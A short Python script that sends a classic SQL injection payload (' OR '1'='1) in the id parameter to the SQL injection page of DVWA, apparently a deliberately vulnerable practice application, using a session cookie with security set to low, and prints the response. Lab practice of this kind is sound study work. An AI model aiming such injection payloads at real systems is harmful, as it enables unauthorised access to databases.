import requests

cookies = {'PHPSESSID': 'g4lf3381t4oikauihrv5k69t70', 'security': 'low'}
url = 'http://dvwa:80/vulnerabilities/sqli/'
res_test = requests.get(url, params={'id': "' OR '1'='1", 'Submit': 'Submit'}, cookies=cookies)
print("--- CONTENT ---")
print(res_test.text)
print("--- END CONTENT ---")
